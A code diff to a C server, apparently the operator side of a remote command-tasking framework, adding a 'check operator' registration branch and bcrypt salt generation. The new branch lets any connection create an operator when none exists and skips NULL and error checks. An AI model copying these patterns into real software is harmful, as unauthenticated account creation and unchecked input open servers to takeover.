@@ -319,8 +319,8 @@ void *operator_handler(void *Args) {
                 cJSON *command = cJSON_GetObjectItem(requested_info, "command");
 				bool added;
 				if (!os) {
-                    added = batch_tasks(con, command->valuestring, NULL);
-                } else {
+                    			added = batch_tasks(con, command->valuestring, NULL);
+                		} else {
 					added = batch_tasks(con, command->valuestring, os->valuestring);
 				}
 				cJSON *isValid = cJSON_CreateObject();
@@ -330,7 +330,27 @@ void *operator_handler(void *Args) {
 				free(info);
 				cJSON_Delete(isValid);
 				
-        }
+        } else if (strcmp(about->valuestring, "check operator") == 0) {
+		cJSON *response = cJSON_CreateObject();
+		bool user = check_operator(con);
+		cJSON_AddBoolToObject(response, "User Exists", user);
+		
+		char *info = cJSON_Print(response);
+		send_json(ssl, info);
+		free(info);
+		cJSON_Delete(response);
+
+		if (!user) {
+			char *get_creds = recv_json(ssl);
+			cJSON *creds = cJSON_Parse(get_creds);
+			cJSON *username = cJSON_GetObjectItem(creds, "username");
+			cJSON *password  = cJSON_GetObjectItem(creds, "password_hash");
+
+			char *salt = generate_salt();
+			char *password_hash  = crypt(password->valuestring, salt);
+			add_operator(con, username->valuestring, password_hash);
+		}
+	}
         cJSON_Delete(requested_info);
     } 
     log_message(LOG_INFO, "Closed connection");
@@ -524,4 +544,41 @@ int operator_file_upload(SSL *ssl) {
     	log_message(LOG_INFO, "Upload Completed");
     	free(contents);
     	return 0;
+}
+
+
+
+
+static const char bcrypt64[] =
+    "./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+void encode_bcrypt64(char *out, const unsigned char *in, size_t len) {
+    int i = 0, j = 0;
+    unsigned int c1, c2, c3;
+    while (i < (int)len) {
+        c1 = in[i++];
+        c2 = i < (int)len ? in[i++] : 0;
+        c3 = i < (int)len ? in[i++] : 0;
+
+        out[j++] = bcrypt64[c1 >> 2];
+        out[j++] = bcrypt64[((c1 & 0x03) << 4) | (c2 >> 4)];
+        if (i <= (int)len + 1)
+            out[j++] = bcrypt64[((c2 & 0x0f) << 2) | (c3 >> 6)];
+        if (i <= (int)len)
+            out[j++] = bcrypt64[c3 & 0x3f];
+    }
+    out[j] = '\0';
+}
+
+char *generate_salt() {
+    static char salt[30];
+    unsigned char random_bytes[16];
+    int fd = open("/dev/urandom", O_RDONLY);
+    read(fd, random_bytes, sizeof(random_bytes));
+    close(fd);
+
+    char encoded[23];
+    encode_bcrypt64(encoded, random_bytes, 16);
+    snprintf(salt, sizeof(salt), "$2b$12$%s", encoded);
+    return salt;
 }
